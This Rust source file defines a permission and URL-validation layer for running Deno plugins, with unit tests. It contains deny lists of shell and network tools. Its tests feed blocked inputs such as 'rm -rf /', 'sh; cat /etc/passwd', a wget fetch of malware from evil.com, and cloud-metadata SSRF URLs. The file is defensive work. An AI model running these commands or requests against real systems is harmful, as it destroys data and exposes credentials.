use anyhow::Result;
use std::path::Path;
use url;

/// Represents the security permissions required for plugin execution
#[derive(Debug, Clone)]
pub struct PluginPermissions {
    pub file_read: Vec<String>,
    pub file_write: Vec<String>,
    pub env_access: bool,
    pub network: Vec<String>,
    pub run_commands: Vec<String>,
}

/// Security validation functions
impl PluginPermissions {
    /// Validate and sanitize a file path to prevent dangerous access
    fn validate_file_path(path: &str) -> Result<String, String> {
        // Block empty paths
        if path.trim().is_empty() {
            return Err("Empty path not allowed".to_string());
        }

        // Block path traversal attempts
        if path.contains("..") {
            return Err(format!("Path traversal not allowed: {}", path));
        }

        // Block access to sensitive system directories
        let dangerous_paths = [
            "/etc/",
            "/root/",
            "/sys/",
            "/proc/",
            "/dev/",
            "/tmp/",
            "/boot/",
            "/usr/bin/",
            "/usr/sbin/",
            "/bin/",
            "/sbin/",
            "C:\\Windows\\",
            "C:\\Program Files\\",
            "C:\\Users\\",
            "C:\\temp\\",
            "/System/",
            "/Library/",
            "/Applications/",
        ];

        for dangerous in &dangerous_paths {
            if path.starts_with(dangerous) {
                return Err(format!("Access to system directory not allowed: {}", path));
            }
        }

        Ok(path.to_string())
    }

    /// Validate network domain/IP to prevent wildcards and dangerous access
    fn validate_network_domain(domain: &str) -> Result<String, String> {
        // Block empty domains
        if domain.trim().is_empty() {
            return Err("Empty domain not allowed".to_string());
        }

        // Block wildcard patterns
        if domain.contains('*') {
            return Err(format!("Wildcard domains not allowed: {}", domain));
        }

        // Block dangerous IPs that could grant broad access
        let dangerous_ips = ["0.0.0.0", "::", "localhost", "127.0.0.1", "::1"];
        for dangerous in &dangerous_ips {
            if domain == *dangerous {
                return Err(format!("Broad network access not allowed: {}", domain));
            }
        }

        // Block private network ranges (could be used for internal attacks)
        if domain.starts_with("192.168.") || domain.starts_with("10.") || domain.starts_with("172.")
        {
            return Err(format!("Private network access not allowed: {}", domain));
        }

        Ok(domain.to_string())
    }

    /// Validate command to prevent injection and dangerous operations
    fn validate_command(command: &str) -> Result<String, String> {
        // Block empty commands
        if command.trim().is_empty() {
            return Err("Empty command not allowed".to_string());
        }

        // Block commands with arguments (potential injection)
        if command.contains(' ') || command.contains('\t') {
            return Err(format!("Commands with arguments not allowed: {}", command));
        }

        // Block shell operators that could enable chaining/injection
        let dangerous_chars = ['&', '|', ';', '>', '<', '`', '$', '(', ')', '{', '}'];
        for dangerous in &dangerous_chars {
            if command.contains(*dangerous) {
                return Err(format!(
                    "Command contains dangerous characters: {}",
                    command
                ));
            }
        }

        // Block inherently dangerous commands
        let dangerous_commands = [
            "rm", "del", "format", "fdisk", "dd", "mkfs", "sudo", "su", "chmod", "chown", "passwd",
            "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "rsync", "ftp", "eval", "exec",
        ];

        for dangerous in &dangerous_commands {
            if command == *dangerous {
                return Err(format!("Dangerous command not allowed: {}", command));
            }
        }

        Ok(command.to_string())
    }
}

impl PluginPermissions {
    /// Create safe conservative defaults that work for most plugins
    pub fn safe_defaults(project_root: &Path) -> Self {
        Self {
            // Allow reading project files and .makeitso directory
            file_read: vec![
                project_root.to_string_lossy().to_string(),
                ".makeitso".to_string(),
            ],
            // Allow writing to project directory only
            file_write: vec![project_root.to_string_lossy().to_string()],
            // Allow environment access (needed for many plugins)
            env_access: true,
            // No network access by default
            network: vec![],
            // No command execution by default
            run_commands: vec![],
        }
    }

    /// Convert permissions to Deno command-line arguments
    pub fn to_deno_args(&self) -> Vec<String> {
        let mut args = Vec::new();

        // File read permissions
        if !self.file_read.is_empty() {
            args.push(format!("--allow-read={}", self.file_read.join(",")));
        }

        // File write permissions
        if !self.file_write.is_empty() {
            args.push(format!("--allow-write={}", self.file_write.join(",")));
        }

        // Environment access
        if self.env_access {
            args.push("--allow-env".to_string());
        }

        // Network access (only if explicitly granted)
        if !self.network.is_empty() {
            args.push(format!("--allow-net={}", self.network.join(",")));
        }

        // Command execution (only if explicitly granted)
        if !self.run_commands.is_empty() {
            args.push(format!("--allow-run={}", self.run_commands.join(",")));
        }

        args
    }

    /// Add additional file read permissions with security validation
    pub fn allow_read<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        let path_str = path.as_ref().to_string_lossy().to_string();
        match Self::validate_file_path(&path_str) {
            Ok(validated_path) => {
                self.file_read.push(validated_path);
            }
            Err(err) => {
                eprintln!("⚠️  Security warning: Blocked dangerous read path: {}", err);
                // For v1.0, we silently block dangerous paths rather than panicking
                // This prevents plugins from accidentally breaking the system
            }
        }
        self
    }

    /// Add additional file write permissions with security validation
    pub fn allow_write<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        let path_str = path.as_ref().to_string_lossy().to_string();
        match Self::validate_file_path(&path_str) {
            Ok(validated_path) => {
                self.file_write.push(validated_path);
            }
            Err(err) => {
                eprintln!(
                    "⚠️  Security warning: Blocked dangerous write path: {}",
                    err
                );
            }
        }
        self
    }

    /// Add network permissions for specific domains with security validation
    pub fn allow_network<S: AsRef<str>>(&mut self, domain: S) -> &mut Self {
        let domain_str = domain.as_ref();
        match Self::validate_network_domain(domain_str) {
            Ok(validated_domain) => {
                self.network.push(validated_domain);
            }
            Err(err) => {
                eprintln!(
                    "⚠️  Security warning: Blocked dangerous network access: {}",
                    err
                );
            }
        }
        self
    }

    /// Add permission to run specific commands with security validation
    pub fn allow_run<S: AsRef<str>>(&mut self, command: S) -> &mut Self {
        let command_str = command.as_ref();
        match Self::validate_command(command_str) {
            Ok(validated_command) => {
                self.run_commands.push(validated_command);
            }
            Err(err) => {
                eprintln!("⚠️  Security warning: Blocked dangerous command: {}", err);
            }
        }
        self
    }
}

/// Build permissions for a plugin execution
///
/// Currently returns safe defaults, but this is where we'll add:
/// - Manifest-declared permissions
/// - CLI override flags
/// - User prompts for new permissions
pub fn build_plugin_permissions(project_root: &Path) -> Result<PluginPermissions> {
    // For now, just return safe defaults
    // TODO: In future versions, this will:
    // 1. Load permissions from plugin manifest
    // 2. Apply CLI override flags
    // 3. Prompt user for additional permissions if needed
    // 4. Cache permission decisions

    Ok(PluginPermissions::safe_defaults(project_root))
}

/// Validate a registry URL for security
pub fn validate_registry_url(url: &str) -> Result<String, String> {
    validate_url_for_git_operations(url, "registry")
}

/// Core URL validation for git operations (registries)
pub fn validate_url_for_git_operations(url: &str, context: &str) -> Result<String, String> {
    // Check for empty or whitespace-only URLs
    if url.trim().is_empty() {
        return Err(format!("Empty {} URL not allowed", context));
    }

    let url_trimmed = url.trim();

    // Handle SSH git URLs (special case - these are legitimate)
    if url_trimmed.starts_with("git@") {
        // SSH URLs like git@github.com:user/repo.git are safe
        // They don't have schemes so URL parsing would fail
        return Ok(url_trimmed.to_string());
    }

    // Check for IPv6 localhost patterns before URL parsing (which might fail)
    if url_trimmed.contains("::1") {
        return Err(format!(
            "localhost/loopback access not allowed for {} URLs",
            context
        ));
    }

    // Parse the URL to extract components
    let parsed_url = url::Url::parse(url_trimmed)
        .map_err(|_| format!("Invalid {} URL format: {}", context, url_trimmed))?;

    let scheme = parsed_url.scheme();
    let host = parsed_url.host_str().unwrap_or("");

    // Check dangerous schemes first (they might not have hosts)
    match scheme {
        "file" => return Err("file:// URLs not allowed for security reasons".to_string()),
        "javascript" | "data" | "ftp" => {
            return Err(format!("Dangerous scheme '{}' not allowed", scheme));
        }
        _ => {} // Continue with other validation
    }

    // Validate the host (this gives more specific error messages for network issues)
    validate_host_for_external_access(host, context)?;

    // Then validate remaining schemes
    match scheme {
        "http" => {
            // Allow HTTP only for certain trusted domains
            if !is_trusted_git_domain(host) {
                return Err("HTTPS required for remote repositories (HTTP is insecure)".to_string());
            }
        }
        "https" | "ssh" | "git" => {
            // These schemes are generally safe
        }
        _ => {
            return Err(format!(
                "Unsupported scheme '{}' for {} URLs",
                scheme, context
            ));
        }
    }

    Ok(url_trimmed.to_string())
}

/// Validate that a host is safe for external access
pub fn validate_host_for_external_access(host: &str, context: &str) -> Result<(), String> {
    if host.is_empty() {
        return Err(format!("Empty host not allowed for {} URLs", context));
    }

    // Block localhost and loopback addresses (including IPv6)
    if host == "localhost" || host == "127.0.0.1" || host == "::1" || host.starts_with("[::1]") {
        return Err(format!(
            "localhost/loopback access not allowed for {} URLs",
            context
        ));
    }

    // Block cloud metadata services
    if host == "169.254.169.254" || host == "100.100.100.200" {
        return Err("Cloud metadata service access not allowed".to_string());
    }

    // Block private network ranges
    if is_private_ip(host) {
        return Err(format!(
            "Private network access not allowed for {} URLs",
            context
        ));
    }

    Ok(())
}

/// Check if an IP address is in a private network range
pub fn is_private_ip(host: &str) -> bool {
    // Check IPv4 private ranges
    if host.starts_with("192.168.") {
        return true;
    }

    if host.starts_with("10.") {
        return true;
    }

    // 172.16.0.0 to 172.31.255.255
    if host.starts_with("172.") {
        if let Some(second_octet) = host.split('.').nth(1) {
            if let Ok(num) = second_octet.parse::<u8>() {
                if (16..=31).contains(&num) {
                    return true;
                }
            }
        }
    }

    // Note: We're not blocking all RFC 1918 ranges or IPv6 private ranges
    // for simplicity, but this covers the most common private networks
    false
}

/// Check if a domain is trusted for git operations (allows HTTP)
pub fn is_trusted_git_domain(_host: &str) -> bool {
    // For now, we don't have any domains that we trust with HTTP
    // All git operations should use HTTPS for security
    // This function exists for future extensibility
    false
}

/// Validate a Deno dependency URL for security
pub fn validate_deno_dependency_url(url: &str) -> Result<String, String> {
    validate_url_for_dependencies(url)
}

/// Core URL validation for dependencies
pub fn validate_url_for_dependencies(url: &str) -> Result<String, String> {
    // Check for empty or whitespace-only URLs
    if url.trim().is_empty() {
        return Err("Empty dependency URL not allowed".to_string());
    }

    let url_trimmed = url.trim();

    // Block relative paths that could be injection attempts
    if url_trimmed.starts_with("../") || url_trimmed.contains("/../") {
        return Err("Relative path injection not allowed in dependency URLs".to_string());
    }

    // Check for IPv6 localhost patterns before URL parsing (which might fail)
    if url_trimmed.contains("::1") {
        return Err("localhost/loopback access not allowed for dependency URLs".to_string());
    }

    // Parse the URL to extract components
    let parsed_url = url::Url::parse(url_trimmed)
        .map_err(|_| format!("Invalid dependency URL format: {}", url_trimmed))?;

    let scheme = parsed_url.scheme();
    let host = parsed_url.host_str().unwrap_or("");

    // Check dangerous schemes first (they might not have hosts)
    match scheme {
        "file" => return Err("file:// scheme not allowed for dependencies".to_string()),
        "javascript" | "data" | "ftp" | "mailto" => {
            return Err(format!(
                "Dangerous scheme '{}' not allowed for dependencies",
                scheme
            ));
        }
        _ => {} // Continue with other validation
    }

    // Validate the host (this gives more specific error messages for network issues)
    validate_host_for_external_access(host, "dependency")?;

    // Then validate remaining schemes
    match scheme {
        "http" => {
            // Require HTTPS for all remote dependencies (stricter than git)
            return Err("HTTPS required for remote dependencies (HTTP is insecure)".to_string());
        }
        "https" => {
            // HTTPS is safe for dependencies
        }
        _ => {
            return Err(format!(
                "Unsupported scheme '{}' for dependency URLs",
                scheme
            ));
        }
    }

    Ok(url_trimmed.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_safe_defaults() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);

        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.file_write, vec!["/test/project"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
        assert_eq!(permissions.run_commands, Vec::<String>::new());
    }

    #[test]
    fn test_to_deno_args_minimal() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);
        let args = permissions.to_deno_args();

        assert_eq!(
            args,
            vec![
                "--allow-read=/test/project,.makeitso",
                "--allow-write=/test/project",
                "--allow-env"
            ]
        );
    }

    #[test]
    fn test_to_deno_args_with_network() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions
            .allow_network("api.github.com")
            .allow_network("registry.npmjs.org");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-net=api.github.com,registry.npmjs.org".to_string()));
    }

    #[test]
    fn test_to_deno_args_with_run_commands() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions.allow_run("git").allow_run("npm");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-run=git,npm".to_string()));
    }

    #[test]
    fn test_absolute_system_path_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to access sensitive system files - these should be blocked
        permissions.allow_read("/etc/passwd");
        permissions.allow_read("/etc/shadow");
        permissions.allow_read("C:\\Windows\\System32\\config\\SAM");
        permissions.allow_write("/etc/crontab");
        permissions.allow_write("/tmp/backdoor"); // /tmp is a system directory

        let args = permissions.to_deno_args();

        // Verify system paths were blocked
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(
            !read_arg.contains("/etc/passwd"),
            "System file access should be blocked"
        );
        assert!(
            !read_arg.contains("/etc/shadow"),
            "System file access should be blocked"
        );
        assert!(
            !read_arg.contains("C:\\Windows\\System32"),
            "System directory access should be blocked"
        );

        // Write arg should only contain project root since system writes were blocked
        let write_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-write="))
            .unwrap();
        assert!(
            !write_arg.contains("/etc/crontab"),
            "System file write should be blocked"
        );
        assert!(
            !write_arg.contains("/tmp/backdoor"),
            "System directory write should be blocked"
        );
        assert_eq!(
            write_arg, "--allow-write=/test/project",
            "Should only contain safe project path"
        );

        // Should only contain safe defaults
        assert!(read_arg.contains("/test/project"));
    }

    #[test]
    fn test_builder_pattern() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Use safe paths that won't be blocked by our security validation
        permissions
            .allow_read("./vendor/certs") // Relative path, safe
            .allow_write("./dist")
            .allow_network("api.example.com")
            .allow_run("docker");

        let args = permissions.to_deno_args();

        // Verify safe permissions were allowed
        assert!(args.contains(&"--allow-read=/test/project,.makeitso,./vendor/certs".to_string()));
        assert!(args.contains(&"--allow-write=/test/project,./dist".to_string()));
        assert!(args.contains(&"--allow-net=api.example.com".to_string()));
        assert!(args.contains(&"--allow-run=docker".to_string()));
    }

    #[test]
    fn test_build_plugin_permissions() {
        let project_root = PathBuf::from("/test/project");
        let result = build_plugin_permissions(&project_root);

        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should return safe defaults for now
        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
    }

    // ========== SECURITY VULNERABILITY TESTS ==========
    // These tests verify that our security validation blocks attack vectors

    #[test]
    fn test_path_traversal_attack_prevention() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt path traversal attacks - these should be blocked
        permissions.allow_read("../../../etc/passwd");
        permissions.allow_read("..\\..\\..\\Windows\\System32");
        permissions.allow_write("../../../tmp/malicious");

        let args = permissions.to_deno_args();

        // Verify attacks were blocked - only safe defaults should remain
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(
            !read_arg.contains("../../../etc/passwd"),
            "Path traversal should be blocked"
        );
        assert!(
            !read_arg.contains("..\\..\\..\\Windows\\System32"),
            "Path traversal should be blocked"
        );

        let write_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-write="))
            .unwrap();
        assert!(
            !write_arg.contains("../../../tmp/malicious"),
            "Path traversal should be blocked"
        );

        // Should only contain safe defaults
        assert!(read_arg.contains("/test/project"));
        assert!(read_arg.contains(".makeitso"));
    }

    #[test]
    fn test_network_wildcard_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to inject wildcards or broad network access - should be blocked
        permissions.allow_network("*");
        permissions.allow_network("*.*");
        permissions.allow_network("0.0.0.0");
        permissions.allow_network("::");
        permissions.allow_network("localhost");
        permissions.allow_network("192.168.1.1");

        let args = permissions.to_deno_args();

        // Should have no network permissions since all were blocked
        let net_arg = args.iter().find(|arg| arg.starts_with("--allow-net="));
        assert!(
            net_arg.is_none(),
            "All dangerous network access should be blocked"
        );
    }

    #[test]
    fn test_command_injection_attempt() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt command injection - should be blocked
        permissions.allow_run("rm -rf /");
        permissions.allow_run("cmd /c del C:\\*");
        permissions.allow_run("sh; cat /etc/passwd");
        permissions.allow_run("git && wget http://evil.com/malware");
        permissions.allow_run("rm"); // Dangerous command
        permissions.allow_run("sudo"); // Dangerous command

        let args = permissions.to_deno_args();

        // Should have no run permissions since all were blocked
        let run_arg = args.iter().find(|arg| arg.starts_with("--allow-run="));
        assert!(
            run_arg.is_none(),
            "All dangerous commands should be blocked"
        );
    }

    #[test]
    fn test_safe_permissions_still_work() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // These should be allowed as they're safe
        permissions.allow_read("./src/file.txt");
        permissions.allow_write("./dist/output.txt");
        permissions.allow_network("api.github.com");
        permissions.allow_network("registry.npmjs.org");
        permissions.allow_run("git");
        permissions.allow_run("npm");
        permissions.allow_run("node");

        let args = permissions.to_deno_args();

        // Verify safe permissions were allowed
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(read_arg.contains("./src/file.txt"));

        let write_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-write="))
            .unwrap();
        assert!(write_arg.contains("./dist/output.txt"));

        let net_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-net="))
            .unwrap();
        assert!(net_arg.contains("api.github.com"));
        assert!(net_arg.contains("registry.npmjs.org"));

        let run_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-run="))
            .unwrap();
        assert!(run_arg.contains("git"));
        assert!(run_arg.contains("npm"));
        assert!(run_arg.contains("node"));
    }

    // ========== REGISTRY URL SECURITY TESTS ==========

    #[test]
    fn test_registry_url_validation_blocks_file_schemes() {
        // Block local file access attempts
        let dangerous_urls = vec![
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///c:/windows/system32/config/sam",
            "file://localhost/etc/passwd",
            "file:///Users/admin/.ssh/id_rsa",
        ];

        for url in dangerous_urls {
            let result = validate_registry_url(url);
            assert!(result.is_err(), "Should block dangerous file URL: {}", url);
            let error = result.unwrap_err();
            assert!(
                error.contains("file:// URLs not allowed"),
                "Error should mention file scheme. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_registry_url_validation_blocks_private_networks() {
        // Block internal network scanning attempts
        let private_urls = vec![
            "http://192.168.1.1/evil-repo",
            "https://192.168.0.254/repo.git",
            "http://10.0.0.1/internal-repo",
            "https://10.255.255.255/secret.git",
            "http://172.16.0.1/admin-repo",
            "https://172.31.255.255/private.git",
            "git://192.168.1.100/repo.git",
        ];

        for url in private_urls {
            let result = validate_registry_url(url);
            assert!(result.is_err(), "Should block private network URL: {}", url);
            let error = result.unwrap_err();
            assert!(
                error.contains("Private network") || error.contains("internal network"),
                "Error should mention private network. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_registry_url_validation_blocks_localhost_access() {
        // Block localhost/loopback SSRF attempts
        let localhost_urls = vec![
            "http://localhost/repo",
            "https://localhost:8080/git",
            "http://127.0.0.1/admin",
            "https://127.0.0.1:3000/secret.git",
            "http://::1/evil",
            "git://localhost/repo.git",
        ];

        for url in localhost_urls {
            let result = validate_registry_url(url);
            assert!(result.is_err(), "Should block localhost URL: {}", url);
            let error = result.unwrap_err();
            assert!(
                error.contains("localhost") || error.contains("loopback"),
                "Error should mention localhost. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_registry_url_validation_blocks_metadata_services() {
        // Block cloud metadata service access
        let metadata_urls = vec![
            "http://169.254.169.254/latest/meta-data/",
            "https://169.254.169.254/metadata/instance",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
        ];

        for url in metadata_urls {
            let result = validate_registry_url(url);
            assert!(
                result.is_err(),
                "Should block metadata service URL: {}",
                url
            );
            let error = result.unwrap_err();
            assert!(
                error.contains("metadata service") || error.contains("cloud metadata"),
                "Error should mention metadata service. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_registry_url_validation_blocks_insecure_remote_protocols() {
        // Block insecure HTTP for remote repositories (HTTPS should be required)
        let insecure_urls = vec![
            "http://github.com/user/repo.git",
            "http://gitlab.com/user/repo.git",
            "http://bitbucket.org/user/repo.git",
            "http://example.com/my-registry.git",
        ];

        for url in insecure_urls {
            let result = validate_registry_url(url);
            assert!(result.is_err(), "Should block insecure HTTP URL: {}", url);
            let error = result.unwrap_err();
            assert!(
                error.contains("HTTPS required") || error.contains("insecure"),
                "Error should mention HTTPS requirement. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_registry_url_validation_allows_legitimate_urls() {
        // Allow legitimate registry URLs
        let legitimate_urls = vec![
            "https://github.com/user/plugin-registry.git",
            "https://gitlab.com/org/plugins.git",
            "https://bitbucket.org/team/registry.git",
            "https://api.github.com/repos/user/registry",
            "https://my-company.com/internal-registry.git",
            "ssh://git@github.com/user/registry.git",
            "git@github.com:user/registry.git",
            "https://registry.example.org/plugins.git",
        ];

        for url in legitimate_urls {
            let result = validate_registry_url(url);
            assert!(
                result.is_ok(),
                "Should allow legitimate URL: {}. Error: {:?}",
                url,
                result
            );
            assert_eq!(
                result.unwrap(),
                url,
                "Should return the original URL unchanged"
            );
        }
    }

    #[test]
    fn test_registry_url_validation_edge_cases() {
        // Test edge cases and malformed URLs
        let edge_cases = vec![
            ("", "Empty URL should be rejected"),
            ("   ", "Whitespace-only URL should be rejected"),
            ("not-a-url", "Invalid URL format should be rejected"),
            ("ftp://example.com/repo", "FTP protocol should be rejected"),
            (
                "javascript:alert(1)",
                "JavaScript scheme should be rejected",
            ),
            ("data:text/plain,evil", "Data scheme should be rejected"),
        ];

        for (url, description) in edge_cases {
            let result = validate_registry_url(url);
            assert!(result.is_err(), "{}: {}", description, url);
        }
    }

    #[test]
    fn test_registry_url_validation_allows_development_localhost() {
        // Special case: Allow localhost only for development with explicit opt-in
        // This test documents the design decision - we might want to allow localhost
        // for development scenarios, but require an explicit flag

        // For now, localhost should be blocked (we can revisit this)
        let dev_urls = vec![
            "http://localhost:3000/dev-registry",
            "https://localhost:8443/test-plugins",
        ];

        for url in dev_urls {
            let result = validate_registry_url(url);
            // Currently blocking localhost - this test documents the current behavior
            assert!(
                result.is_err(),
                "Currently blocking localhost for security: {}",
                url
            );
        }

        // TODO: In future, we might want to add a --allow-localhost flag for development
        // let result = validate_registry_url_with_options("http://localhost:3000/repo", true);
        // assert!(result.is_ok(), "Should allow localhost with explicit flag");
    }

    // ========== DENO DEPENDENCY URL SECURITY TESTS ==========

    #[test]
    fn test_deno_dependency_url_validation_blocks_dangerous_schemes() {
        // Block dangerous schemes for Deno dependencies
        let dangerous_urls = vec![
            "file:///etc/passwd",
            "file:///c:/windows/system32/malware.ts",
            "javascript:alert('xss')",
            "data:text/javascript,alert(1)",
            "ftp://evil.com/backdoor.ts",
        ];

        for url in dangerous_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_err(),
                "Should block dangerous dependency URL: {}",
                url
            );
            let error = result.unwrap_err();
            assert!(
                error.contains("scheme not allowed") || error.to_lowercase().contains("dangerous"),
                "Error should mention dangerous scheme. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_deno_dependency_url_validation_blocks_private_networks() {
        // Block internal network access for dependencies
        let private_urls = vec![
            "https://192.168.1.100/malicious.ts",
            "http://10.0.0.5/backdoor.js",
            "https://172.16.50.1/evil-lib.ts",
            "http://localhost:8080/internal-api.ts",
            "https://127.0.0.1:3000/secret.js",
        ];

        for url in private_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_err(),
                "Should block private network dependency: {}",
                url
            );
            let error = result.unwrap_err();
            assert!(
                error.contains("Private network") || error.contains("localhost"),
                "Error should mention network restriction. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_deno_dependency_url_validation_blocks_metadata_services() {
        // Block cloud metadata services for dependencies
        let metadata_urls = vec![
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "https://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ];

        for url in metadata_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_err(),
                "Should block metadata service dependency: {}",
                url
            );
            let error = result.unwrap_err();
            assert!(
                error.contains("metadata service"),
                "Error should mention metadata service. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_deno_dependency_url_validation_allows_legitimate_deps() {
        // Allow legitimate Deno dependency URLs
        let legitimate_urls = vec![
            "https://deno.land/x/oak@v12.6.1/mod.ts",
            "https://deno.land/std@0.204.0/http/server.ts",
            "https://esm.sh/react@18.2.0",
            "https://cdn.skypack.dev/lodash@4.17.21",
            "https://unpkg.com/moment@2.29.4/moment.js",
            "https://cdn.jsdelivr.net/npm/axios@1.5.0/dist/axios.min.js",
            "https://raw.githubusercontent.com/user/repo/main/lib.ts",
            "https://api.github.com/repos/user/repo/contents/mod.ts",
        ];

        for url in legitimate_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_ok(),
                "Should allow legitimate dependency: {}. Error: {:?}",
                url,
                result
            );
            assert_eq!(
                result.unwrap(),
                url,
                "Should return the original URL unchanged"
            );
        }
    }

    #[test]
    fn test_deno_dependency_url_validation_requires_https_for_remote() {
        // Require HTTPS for remote dependencies (security best practice)
        let insecure_urls = vec![
            "http://deno.land/x/oak/mod.ts",
            "http://example.com/library.ts",
            "http://cdn.example.org/module.js",
        ];

        for url in insecure_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_err(),
                "Should require HTTPS for remote dependency: {}",
                url
            );
            let error = result.unwrap_err();
            assert!(
                error.contains("HTTPS required"),
                "Error should mention HTTPS requirement. Got: {}",
                error
            );
        }
    }

    #[test]
    fn test_deno_dependency_url_validation_edge_cases() {
        // Test edge cases for dependency URLs
        let edge_cases = vec![
            ("", "Empty dependency URL should be rejected"),
            ("   ", "Whitespace-only dependency URL should be rejected"),
            (
                "not-a-url",
                "Invalid dependency URL format should be rejected",
            ),
            (
                "../../../etc/passwd",
                "Relative path injection should be rejected",
            ),
            (
                "mailto:admin@example.com",
                "Email scheme should be rejected",
            ),
        ];

        for (url, description) in edge_cases {
            let result = validate_deno_dependency_url(url);
            assert!(result.is_err(), "{}: {}", description, url);
        }
    }
}
